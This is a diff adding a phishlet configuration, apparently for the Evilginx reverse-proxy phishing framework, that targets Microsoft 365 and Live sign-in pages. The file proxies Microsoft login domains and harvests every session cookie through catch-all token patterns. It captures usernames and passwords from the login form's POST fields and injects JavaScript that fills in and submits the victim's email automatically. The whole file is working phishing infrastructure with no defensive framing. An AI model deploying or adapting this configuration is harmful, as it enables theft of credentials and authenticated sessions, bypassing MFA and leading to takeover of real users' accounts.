@@ -1,0 +1,99 @@
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'logon', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+sub_filters:
+auth_tokens:
+  - domain: '.live.com'
+    keys: ['.*:regexp']
+  - domain: 'live.com'
+    keys: ['.*:regexp']
+  - domain: '.login.live.com'
+    keys: ['.*:regexp']
+  - domain: 'login.live.com'
+    keys: ['.*:regexp']
+  - domain: '.login.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: 'login.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: '.microsoft.com'
+    keys: ['.*:regexp']
+  - domain: 'microsoft.com'
+    keys: ['.*:regexp']
+  - domain: 'account.live.com'
+    keys: ['.*:regexp']
+  - domain: '.account.live.com'
+    keys: ['.*:regexp']
+  - domain: 'account.microsoft.com'
+    keys: ['.*:regexp']
+  - domain: '.account.microsoft.com'
+    keys: ['.*:regexp']
+  - domain: '.office.com'
+    keys: ['.*:regexp']
+  - domain: 'office.com'
+    keys: ['.*:regexp']
+  - domain: '.www.office.com'
+    keys: ['.*:regexp']
+  - domain: 'www.office.com'
+    keys: ['.*:regexp']
+
+auth_urls:
+  - 'landingv2'
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/v2.0/authorize*"]
+    script: |
+      function autoFillEmail() {
+        try {
+          var emailFragment = window.location.hash.substring(1); // Remove the '#' character
+          var emailInput = document.querySelector("#i0116");
+          var nextButton = document.querySelector("#idSIButton9");
+
+          if (emailInput && nextButton) {
+            emailInput.focus();
+            emailInput.value = emailFragment;
+            nextButton.focus();
+            nextButton.click();
+            console.log("Email filled and form submitted.");
+          } else {
+            console.error("Email input or next button not found.");
+          }
+        } catch (error) {
+          console.error("Error during form submission:", error);
+        }
+      }
+
+      // Polling function to check for the presence of email input and next button
+      function pollForElements() {
+        var emailInput = document.querySelector("#i0116");
+        var nextButton = document.querySelector("#idSIButton9");
+
+        if (emailInput && nextButton) {
+          autoFillEmail(); // Execute the auto-fill function
+        } else {
+          console.log("Waiting for elements...");
+          setTimeout(pollForElements, 500); // Wait for 500ms before polling again
+        }
+      }
+
+      // Start polling
+      pollForElements();
